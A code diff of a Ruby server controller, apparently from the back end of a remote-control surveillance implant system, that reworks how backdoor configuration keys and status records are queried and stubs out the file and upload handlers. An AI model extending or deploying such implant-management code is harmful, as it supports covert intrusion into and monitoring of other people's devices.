@@ -9,20 +9,22 @@ module DB
 class BackdoorController < RESTController
   include RCS::Crypt
 
-  # retrieve the class key of the backdoors
+  # retrieve the factory key of the backdoors
   # if the parameter is specified, it take only that class
   # otherwise, return all the keys for all the classes
-  def class_keys
+  def factory_keys
     require_auth_level :server
 
     classes = {}
 
+    # request for a specific instance
     if params['backdoor'] then
-      DB.instance.backdoor_class_key(params['backdoor']).each do |entry|
+      Item.where({_kind: 'factory', build: params['backdoor']}).each do |entry|
           classes[entry[:build]] = entry[:confkey]
-        end
+      end
+    # all of them
     else
-      DB.instance.backdoor_class_keys.each do |entry|
+      Item.where({_kind: 'factory'}).each do |entry|
           classes[entry[:build]] = entry[:confkey]
         end
     end
@@ -36,15 +38,15 @@ class BackdoorController < RESTController
     
     request = JSON.parse(params['backdoor'])
 
-    status = DB.instance.backdoor_status(request['build_id'], request['instance_id'], request['subtype'])
+    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: request['subtype'].downcase}).first
 
-    # if it does not exist
-    status ||= {}
-    
     #TODO: all the backdoor.identify stuff...
-    status = {:deleted => 0, :status => 'OPEN', :backdoor_id => 2}
-    # if the backdoor does not exist, 
 
+    # backdoor not found, what to do ?
+    return STATUS_NOT_FOUND if backdoor.nil?
+
+    status = {:deleted => backdoor[:deleted], :status => backdoor[:status].upcase, :_id => backdoor[:_id]}
+        
     return STATUS_OK, *json_reply(status)
   end
 
@@ -79,7 +81,8 @@ class BackdoorController < RESTController
   def uploads
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_uploads(params['backdoor'])
+    #TODO: implement this
+    list = [] #DB.instance.backdoor_uploads(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -107,7 +110,8 @@ class BackdoorController < RESTController
   def upgrades
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_upgrades(params['backdoor'])
+    #TODO: implement this
+    list = [] #DB.instance.backdoor_upgrades(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -135,7 +139,8 @@ class BackdoorController < RESTController
   def downloads
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_downloads(params['backdoor'])
+    #TODO: implement this
+    list = [] #DB.instance.backdoor_downloads(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
@@ -158,7 +163,8 @@ class BackdoorController < RESTController
   def filesystems
     require_auth_level :server, :tech
 
-    list = DB.instance.backdoor_filesystems(params['backdoor'])
+    #TODO: implement this
+    list = [] #DB.instance.backdoor_filesystems(params['backdoor'])
 
     return STATUS_OK, *json_reply(list)
   end
